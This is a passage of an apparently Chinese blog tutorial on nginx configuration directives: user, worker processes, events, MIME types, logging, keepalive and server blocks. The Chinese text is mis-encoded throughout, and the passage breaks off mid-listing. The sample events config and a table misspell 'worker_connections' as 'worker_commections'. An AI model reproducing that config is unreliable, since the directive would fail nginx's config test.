class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome to nginx!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and<br>working. Further configuration is required.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>For online documentation and support please refer to<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>Commercial support is available at<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Thank you for using nginx.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>I am WWW<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>(5)ä¿®æ”¹nginx.conf</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-keyword">location</span> / &#123;<br>root   /root/html;<br><span class="hljs-keyword">index</span>  <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br></code></pre></td></tr></table></figure><p>(5)æµ‹è¯•å¯åŠ¨è®¿é—®</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é¡µé¢ä¼šæŠ¥403æ‹’ç»è®¿é—®çš„é”™è¯¯<br></code></pre></td></tr></table></figure><p>(6)åˆ†æåŸå› </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">å› ä¸ºå½“å‰ç”¨æˆ·æ²¡æœ‰è®¿é—®<span class="hljs-regexp">/root/</span>htmlç›®å½•çš„æƒé™<br></code></pre></td></tr></table></figure><p>(7)å°†æ–‡ä»¶åˆ›å»ºåˆ° <code>/home/www/html/index.html</code>,ä¿®æ”¹é…ç½®</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-keyword">location</span> / &#123;<br>root   /home/www/html;<br><span class="hljs-keyword">index</span>  <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br></code></pre></td></tr></table></figure><p>(8)å†æ¬¡æµ‹è¯•å¯åŠ¨è®¿é—®</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">èƒ½æ­£å¸¸è®¿é—®ã€‚<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šæ‰€è¿°ï¼Œä½¿ç”¨useræŒ‡ä»¤å¯ä»¥æŒ‡å®šå¯åŠ¨è¿è¡Œå·¥ä½œè¿›ç¨‹çš„ç”¨æˆ·åŠç”¨æˆ·ç»„ï¼Œè¿™æ ·å¯¹äºç³»ç»Ÿçš„æƒé™è®¿é—®æ§åˆ¶çš„æ›´åŠ ç²¾ç»†ï¼Œä¹Ÿæ›´åŠ å®‰å…¨ã€‚</p><h4 id="work-processæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#work-processæŒ‡ä»¤"></a> work processæŒ‡ä»¤</h4><p>master_process:ç”¨æ¥æŒ‡å®šæ˜¯å¦å¼€å¯å·¥ä½œè¿›ç¨‹ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>master_process on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>master_process on;</td></tr><tr><td>ä½ç½®</td><td>å…¨å±€å—</td></tr></tbody></table><p>worker_processes:ç”¨äºé…ç½®Nginxç”Ÿæˆå·¥ä½œè¿›ç¨‹çš„æ•°é‡ï¼Œè¿™ä¸ªæ˜¯NginxæœåŠ¡å™¨å®ç°å¹¶å‘å¤„ç†æœåŠ¡çš„å…³é”®æ‰€åœ¨ã€‚ç†è®ºä¸Šæ¥è¯´workder processçš„å€¼è¶Šå¤§ï¼Œå¯ä»¥æ”¯æŒçš„å¹¶å‘å¤„ç†é‡ä¹Ÿè¶Šå¤šï¼Œä½†äº‹å®ä¸Šè¿™ä¸ªå€¼çš„è®¾å®šæ˜¯éœ€è¦å—åˆ°æ¥è‡ªæœåŠ¡å™¨è‡ªèº«çš„é™åˆ¶ï¼Œå»ºè®®å°†è¯¥å€¼å’ŒæœåŠ¡å™¨CPUçš„å†…æ ¸æ•°ä¿å­˜ä¸€è‡´ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>worker_processes     num/auto;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>1</td></tr><tr><td>ä½ç½®</td><td>å…¨å±€å—</td></tr></tbody></table><p>å¦‚æœå°†worker_processesè®¾ç½®æˆ2ï¼Œåˆ™ä¼šçœ‹åˆ°å¦‚ä¸‹å†…å®¹:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581563242526.png" alt="1581563242526" /></p><h4 id="å…¶ä»–æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#å…¶ä»–æŒ‡ä»¤"></a> å…¶ä»–æŒ‡ä»¤</h4><p>daemonï¼šè®¾å®šNginxæ˜¯å¦ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨ã€‚</p><p>å®ˆæŠ¤å¼è¿›ç¨‹æ˜¯linuxåå°æ‰§è¡Œçš„ä¸€ç§æœåŠ¡è¿›ç¨‹ï¼Œç‰¹ç‚¹æ˜¯ç‹¬ç«‹äºæ§åˆ¶ç»ˆç«¯ï¼Œä¸ä¼šéšç€ç»ˆç«¯å…³é—­è€Œåœæ­¢ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>daemon on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>daemon on;</td></tr><tr><td>ä½ç½®</td><td>å…¨å±€å—</td></tr></tbody></table><p>pid:ç”¨æ¥é…ç½®Nginxå½“å‰masterè¿›ç¨‹çš„è¿›ç¨‹å·IDå­˜å‚¨çš„æ–‡ä»¶è·¯å¾„ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>pid file;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>é»˜è®¤ä¸º:/usr/local/nginx/logs/nginx.pid</td></tr><tr><td>ä½ç½®</td><td>å…¨å±€å—</td></tr></tbody></table><p>è¯¥å±æ€§å¯ä»¥é€šè¿‡<code>./configure --pid-path=PATH</code>æ¥æŒ‡å®š</p><p>error_log:ç”¨æ¥é…ç½®Nginxçš„é”™è¯¯æ—¥å¿—å­˜æ”¾è·¯å¾„</p><table><thead><tr><th>è¯­æ³•</th><th>error_log  file [æ—¥å¿—çº§åˆ«];</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>error_log logs/error.log error;</td></tr><tr><td>ä½ç½®</td><td>å…¨å±€å—ã€httpã€serverã€location</td></tr></tbody></table><p>è¯¥å±æ€§å¯ä»¥é€šè¿‡<code>./configure --error-log-path=PATH</code>æ¥æŒ‡å®š</p><p>å…¶ä¸­æ—¥å¿—çº§åˆ«çš„å€¼æœ‰ï¼šdebug|info|notice|warn|error|crit|alert|emergï¼Œç¿»è¯‘è¿‡æ¥ä¸ºè¯•|ä¿¡æ¯|é€šçŸ¥|è­¦å‘Š|é”™è¯¯|ä¸´ç•Œ|è­¦æŠ¥|ç´§æ€¥ï¼Œè¿™å—å»ºè®®å¤§å®¶è®¾ç½®çš„æ—¶å€™ä¸è¦è®¾ç½®æˆinfoä»¥ä¸‹çš„ç­‰çº§ï¼Œå› ä¸ºä¼šå¸¦æ¥å¤§é‡çš„ç£ç›˜I/Oæ¶ˆè€—ï¼Œå½±å“Nginxçš„æ€§èƒ½ã€‚</p><p>ï¼ˆ5ï¼‰include:ç”¨æ¥å¼•å…¥å…¶ä»–é…ç½®æ–‡ä»¶ï¼Œä½¿Nginxçš„é…ç½®æ›´åŠ çµæ´»</p><table><thead><tr><th>è¯­æ³•</th><th>include file;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>æ— </td></tr><tr><td>ä½ç½®</td><td>any</td></tr></tbody></table><h3 id="eventså—"><a class="markdownIt-Anchor" href="#eventså—"></a> eventså—</h3><p>ï¼ˆ1ï¼‰accept_mutex:ç”¨æ¥è®¾ç½®Nginxç½‘ç»œè¿æ¥åºåˆ—åŒ–</p><table><thead><tr><th>è¯­æ³•</th><th>accept_mutex on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>accept_mutex on;</td></tr><tr><td>ä½ç½®</td><td>events</td></tr></tbody></table><p>è¿™ä¸ªé…ç½®ä¸»è¦å¯ä»¥ç”¨æ¥è§£å†³å¸¸è¯´çš„&quot;æƒŠç¾¤&quot;é—®é¢˜ã€‚å¤§è‡´æ„æ€æ˜¯åœ¨æŸä¸€ä¸ªæ—¶åˆ»ï¼Œå®¢æˆ·ç«¯å‘æ¥ä¸€ä¸ªè¯·æ±‚è¿æ¥ï¼ŒNginxåå°æ˜¯ä»¥å¤šè¿›ç¨‹çš„å·¥ä½œæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´æœ‰å¤šä¸ªworkerè¿›ç¨‹ä¼šè¢«åŒæ—¶å”¤é†’ï¼Œä½†æ˜¯æœ€ç»ˆåªä¼šæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è·å–åˆ°è¿æ¥ï¼Œå¦‚æœæ¯æ¬¡å”¤é†’çš„è¿›ç¨‹æ•°ç›®å¤ªå¤šï¼Œå°±ä¼šå½±å“Nginxçš„æ•´ä½“æ€§èƒ½ã€‚å¦‚æœå°†ä¸Šè¿°å€¼è®¾ç½®ä¸ºon(å¼€å¯çŠ¶æ€)ï¼Œå°†ä¼šå¯¹å¤šä¸ªNginxè¿›ç¨‹æ¥æ”¶è¿æ¥è¿›è¡Œåºåˆ—å·ï¼Œä¸€ä¸ªä¸ªæ¥å”¤é†’æ¥æ”¶ï¼Œå°±é˜²æ­¢äº†å¤šä¸ªè¿›ç¨‹å¯¹è¿æ¥çš„äº‰æŠ¢ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581566971955.png" alt="1581566971955" /></p><p>ï¼ˆ2ï¼‰multi_accept:ç”¨æ¥è®¾ç½®æ˜¯å¦å…è®¸åŒæ—¶æ¥æ”¶å¤šä¸ªç½‘ç»œè¿æ¥</p><table><thead><tr><th>è¯­æ³•</th><th>multi_accept on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>multi_accept off;</td></tr><tr><td>ä½ç½®</td><td>events</td></tr></tbody></table><p>å¦‚æœmulti_acceptè¢«ç¦æ­¢äº†ï¼Œnginxä¸€ä¸ªå·¥ä½œè¿›ç¨‹åªèƒ½åŒæ—¶æ¥å—ä¸€ä¸ªæ–°çš„è¿æ¥ã€‚å¦åˆ™ï¼Œä¸€ä¸ªå·¥ä½œè¿›ç¨‹å¯ä»¥åŒæ—¶æ¥å—æ‰€æœ‰çš„æ–°è¿æ¥</p><p>ï¼ˆ3ï¼‰worker_connectionsï¼šç”¨æ¥é…ç½®å•ä¸ªworkerè¿›ç¨‹æœ€å¤§çš„è¿æ¥æ•°</p><table><thead><tr><th>è¯­æ³•</th><th>worker_connections number;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>worker_commections 512;</td></tr><tr><td>ä½ç½®</td><td>events</td></tr></tbody></table><p>è¿™é‡Œçš„è¿æ¥æ•°ä¸ä»…ä»…åŒ…æ‹¬å’Œå‰ç«¯ç”¨æˆ·å»ºç«‹çš„è¿æ¥æ•°ï¼Œè€Œæ˜¯åŒ…æ‹¬æ‰€æœ‰å¯èƒ½çš„è¿æ¥æ•°ã€‚å¦å¤–ï¼Œnumberå€¼ä¸èƒ½å¤§äºæ“ä½œç³»ç»Ÿæ”¯æŒæ‰“å¼€çš„æœ€å¤§æ–‡ä»¶å¥æŸ„æ•°é‡ã€‚</p><p>ï¼ˆ4ï¼‰use:ç”¨æ¥è®¾ç½®NginxæœåŠ¡å™¨é€‰æ‹©å“ªç§äº‹ä»¶é©±åŠ¨æ¥å¤„ç†ç½‘ç»œæ¶ˆæ¯ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>use  method;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>æ ¹æ®æ“ä½œç³»ç»Ÿå®š</td></tr><tr><td>ä½ç½®</td><td>events</td></tr></tbody></table><p>æ³¨æ„ï¼šæ­¤å¤„æ‰€é€‰æ‹©äº‹ä»¶å¤„ç†æ¨¡å‹æ˜¯Nginxä¼˜åŒ–éƒ¨åˆ†çš„ä¸€ä¸ªé‡è¦å†…å®¹ï¼Œmethodçš„å¯é€‰å€¼æœ‰select/poll/epoll/kqueueç­‰ï¼Œä¹‹å‰åœ¨å‡†å¤‡centosç¯å¢ƒçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¼ºè°ƒè¿‡è¦ä½¿ç”¨linuxå†…æ ¸åœ¨2.6ä»¥ä¸Šï¼Œå°±æ˜¯ä¸ºäº†èƒ½ä½¿ç”¨epollå‡½æ•°æ¥ä¼˜åŒ–Nginxã€‚</p><p>å¦å¤–è¿™äº›å€¼çš„é€‰æ‹©ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨</p><p><code>--with-select_module</code>ã€<code>--without-select_module</code>ã€</p><p><code>--with-poll_module</code>ã€<code>--without-poll_module</code>æ¥è®¾ç½®æ˜¯å¦éœ€è¦å°†å¯¹åº”çš„äº‹ä»¶é©±åŠ¨æ¨¡å—ç¼–è¯‘åˆ°Nginxçš„å†…æ ¸ã€‚</p><h4 id="eventsæŒ‡ä»¤é…ç½®å®ä¾‹"><a class="markdownIt-Anchor" href="#eventsæŒ‡ä»¤é…ç½®å®ä¾‹"></a> eventsæŒ‡ä»¤é…ç½®å®ä¾‹</h4><p>æ‰“å¼€Nginxçš„é…ç½®æ–‡ä»¶ nginx.conf,æ·»åŠ å¦‚ä¸‹é…ç½®</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">events&#123;<br>accept_mutex on<span class="hljs-comment">;</span><br>multi_accept on<span class="hljs-comment">;</span><br>worker_commections <span class="hljs-number">1024</span><span class="hljs-comment">;</span><br>use epoll<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æµ‹è¯•</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./nginx</span> -t<br><span class="hljs-string">./nginx</span> -s <span class="hljs-keyword">reload</span><br></code></pre></td></tr></table></figure><h3 id="httpå—"><a class="markdownIt-Anchor" href="#httpå—"></a> httpå—</h3><h4 id="å®šä¹‰mime-type"><a class="markdownIt-Anchor" href="#å®šä¹‰mime-type"></a> å®šä¹‰MIME-Type</h4><p>æˆ‘ä»¬éƒ½çŸ¥é“æµè§ˆå™¨ä¸­å¯ä»¥æ˜¾ç¤ºçš„å†…å®¹æœ‰HTMLã€XMLã€GIFç­‰ç§ç±»ç¹å¤šçš„æ–‡ä»¶ã€åª’ä½“ç­‰èµ„æºï¼Œæµè§ˆå™¨ä¸ºäº†åŒºåˆ†è¿™äº›èµ„æºï¼Œå°±éœ€è¦ä½¿ç”¨MIME Typeã€‚æ‰€ä»¥è¯´MIME Typeæ˜¯ç½‘ç»œèµ„æºçš„åª’ä½“ç±»å‹ã€‚Nginxä½œä¸ºwebæœåŠ¡å™¨ï¼Œä¹Ÿéœ€è¦èƒ½å¤Ÿè¯†åˆ«å‰ç«¯è¯·æ±‚çš„èµ„æºç±»å‹ã€‚</p><p>åœ¨Nginxçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œé»˜è®¤æœ‰ä¸¤è¡Œé…ç½®</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">include mime.types<span class="hljs-comment">;</span><br>default_type application/octet-stream<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ1ï¼‰default_type:ç”¨æ¥é…ç½®Nginxå“åº”å‰ç«¯è¯·æ±‚é»˜è®¤çš„MIMEç±»å‹ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>default_type mime-type;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>default_type text/plainï¼›</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>åœ¨default_typeä¹‹å‰è¿˜æœ‰ä¸€å¥<code>include mime.types</code>,includeä¹‹å‰æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡ï¼Œç›¸å½“äºæŠŠmime.typesæ–‡ä»¶ä¸­MIMTç±»å‹ä¸ç›¸å…³ç±»å‹æ–‡ä»¶çš„æ–‡ä»¶åç¼€åçš„å¯¹åº”å…³ç³»åŠ å…¥åˆ°å½“å‰çš„é…ç½®æ–‡ä»¶ä¸­ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´æ˜ï¼š</p><p>æœ‰äº›æ—¶å€™è¯·æ±‚æŸäº›æ¥å£çš„æ—¶å€™éœ€è¦è¿”å›æŒ‡å®šçš„æ–‡æœ¬å­—ç¬¦ä¸²æˆ–è€…jsonå­—ç¬¦ä¸²ï¼Œå¦‚æœé€»è¾‘éå¸¸ç®€å•æˆ–è€…å¹²è„†æ˜¯å›ºå®šçš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨nginxå¿«é€Ÿå®ç°ï¼Œè¿™æ ·å°±ä¸ç”¨ç¼–å†™ç¨‹åºå“åº”è¯·æ±‚äº†ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨èµ„æºå ç”¨å¹¶ä¸”å“åº”æ€§èƒ½éå¸¸å¿«ã€‚</p><p>å¦‚ä½•å®ç°:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/get_text</span> &#123;<br><span class="hljs-comment">#è¿™é‡Œä¹Ÿå¯ä»¥è®¾ç½®æˆtext/plain</span><br>    default_type text/html;<br>    return <span class="hljs-number">200</span> <span class="hljs-string">&quot;This is nginx&#x27;s text&quot;</span>;<br>&#125;<br><span class="hljs-keyword">location</span> <span class="hljs-title">/get_json</span>&#123;<br>    default_type application/json;<br>    return <span class="hljs-number">200</span> &#x27;&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;TOM&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è‡ªå®šä¹‰æœåŠ¡æ—¥å¿—"><a class="markdownIt-Anchor" href="#è‡ªå®šä¹‰æœåŠ¡æ—¥å¿—"></a> è‡ªå®šä¹‰æœåŠ¡æ—¥å¿—</h4><p>Nginxä¸­æ—¥å¿—çš„ç±»å‹åˆ†access.logã€error.logã€‚</p><p>access.log:ç”¨æ¥è®°å½•ç”¨æˆ·æ‰€æœ‰çš„è®¿é—®è¯·æ±‚ã€‚</p><p>error.log:è®°å½•nginxæœ¬èº«è¿è¡Œæ—¶çš„é”™è¯¯ä¿¡æ¯ï¼Œä¸ä¼šè®°å½•ç”¨æˆ·çš„è®¿é—®è¯·æ±‚ã€‚</p><p>NginxæœåŠ¡å™¨æ”¯æŒå¯¹æœåŠ¡æ—¥å¿—çš„æ ¼å¼ã€å¤§å°ã€è¾“å‡ºç­‰è¿›è¡Œè®¾ç½®ï¼Œéœ€è¦ä½¿ç”¨åˆ°ä¸¤ä¸ªæŒ‡ä»¤ï¼Œåˆ†åˆ«æ˜¯access_logå’Œlog_formatæŒ‡ä»¤ã€‚</p><p>ï¼ˆ1ï¼‰access_log:ç”¨æ¥è®¾ç½®ç”¨æˆ·è®¿é—®æ—¥å¿—çš„ç›¸å…³å±æ€§ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>access_log path[format[buffer=size]]</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>access_log logs/access.log combined;</td></tr><tr><td>ä½ç½®</td><td><code>http</code>, <code>server</code>, <code>location</code></td></tr></tbody></table><p>ï¼ˆ2ï¼‰log_format:ç”¨æ¥æŒ‡å®šæ—¥å¿—çš„è¾“å‡ºæ ¼å¼ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>log_format name [escape=default|json|none] stringâ€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>log_format combined â€œâ€¦â€;</td></tr><tr><td>ä½ç½®</td><td>http</td></tr></tbody></table><h4 id="å…¶ä»–é…ç½®æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#å…¶ä»–é…ç½®æŒ‡ä»¤"></a> å…¶ä»–é…ç½®æŒ‡ä»¤</h4><p>ï¼ˆ1ï¼‰sendfile:ç”¨æ¥è®¾ç½®NginxæœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨sendfile()ä¼ è¾“æ–‡ä»¶ï¼Œè¯¥å±æ€§å¯ä»¥å¤§å¤§æé«˜Nginxå¤„ç†é™æ€èµ„æºçš„æ€§èƒ½</p><table><thead><tr><th>è¯­æ³•</th><th>sendfile on|offï¼›</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>sendfile off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>ï¼ˆ2ï¼‰keepalive_timeout:ç”¨æ¥è®¾ç½®é•¿è¿æ¥çš„è¶…æ—¶æ—¶é—´ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨keepaliveï¼Ÿ</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">æˆ‘ä»¬éƒ½çŸ¥é“HTTPæ˜¯ä¸€ç§æ— çŠ¶æ€åè®®ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªTCPè¯·æ±‚ï¼ŒæœåŠ¡ç«¯å“åº”å®Œæ¯•åæ–­å¼€è¿æ¥ã€‚<br>å¦‚ä½•å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€å¤šä¸ªè¯·æ±‚ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½éœ€è¦é‡æ–°åˆ›å»ºä¸€æ¬¡è¿æ¥ï¼Œæ•ˆç‡ç›¸å¯¹æ¥è¯´æ¯”è¾ƒå¤šï¼Œä½¿ç”¨keepaliveæ¨¡å¼ï¼Œå¯ä»¥å‘Šè¯‰æœåŠ¡å™¨ç«¯åœ¨å¤„ç†å®Œä¸€ä¸ªè¯·æ±‚åä¿æŒè¿™ä¸ªTCPè¿æ¥çš„æ‰“å¼€çŠ¶æ€ï¼Œè‹¥æ¥æ”¶åˆ°æ¥è‡ªè¿™ä¸ªå®¢æˆ·ç«¯çš„å…¶ä»–è¯·æ±‚ï¼ŒæœåŠ¡ç«¯å°±ä¼šåˆ©ç”¨è¿™ä¸ªæœªè¢«å…³é—­çš„è¿æ¥ï¼Œè€Œä¸éœ€è¦é‡æ–°åˆ›å»ºä¸€ä¸ªæ–°è¿æ¥ï¼Œæå‡æ•ˆç‡ï¼Œä½†æ˜¯è¿™ä¸ªè¿æ¥ä¹Ÿä¸èƒ½ä¸€ç›´ä¿æŒï¼Œè¿™æ ·çš„è¯ï¼Œè¿æ¥å¦‚æœè¿‡å¤šï¼Œä¹Ÿä¼šæ˜¯æœåŠ¡ç«¯çš„æ€§èƒ½ä¸‹é™ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬è¿›è¡Œè®¾ç½®å…¶çš„è¶…æ—¶æ—¶é—´ã€‚<br></code></pre></td></tr></table></figure><table><thead><tr><th>è¯­æ³•</th><th>keepalive_timeout time;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>keepalive_timeout 75s;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>ï¼ˆ3ï¼‰keepalive_requests:ç”¨æ¥è®¾ç½®ä¸€ä¸ªkeep-aliveè¿æ¥ä½¿ç”¨çš„æ¬¡æ•°ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>keepalive_requests number;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>keepalive_requests 100;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><h3 id="serverå—å’Œlocationå—"><a class="markdownIt-Anchor" href="#serverå—å’Œlocationå—"></a> serverå—å’Œlocationå—</h3><p>serverå—å’Œlocationå—éƒ½æ˜¯æˆ‘ä»¬è¦é‡ç‚¹è®²è§£å’Œå­¦ä¹ çš„å†…å®¹ï¼Œå› ä¸ºæˆ‘ä»¬åé¢ä¼šå¯¹Nginxçš„åŠŸèƒ½è¿›è¡Œè¯¦ç»†è®²è§£ï¼Œæ‰€ä»¥è¿™å—å†…å®¹å°±æ”¾åˆ°é™æ€èµ„æºéƒ¨ç½²çš„åœ°æ–¹ç»™å¤§å®¶è¯¦ç»†è¯´æ˜ã€‚</p><p>æœ¬èŠ‚æˆ‘ä»¬ä¸»è¦æ¥è®¤è¯†ä¸‹Nginxé»˜è®¤ç»™çš„nginx.confä¸­çš„ç›¸å…³å†…å®¹ï¼Œä»¥åŠserverå—ä¸locationå—åœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„çš„ä¸€äº›å†…å®¹ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>       <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>       <span class="hljs-attribute">server_name</span>  localhost;<br>       <span class="hljs-section">location</span> / &#123;<br>           <span class="hljs-attribute">root</span>   html;<br>           <span class="hljs-attribute">index</span>  index.html index.htm;<br>       &#125;<br>      <br>       <span class="hljs-attribute">error_page</span>   <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> <span class="hljs-number">404</span>  /50x.html;<br>       <span class="hljs-section">location</span> = /50x.html &#123;<br>           <span class="hljs-attribute">root</span>   html;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 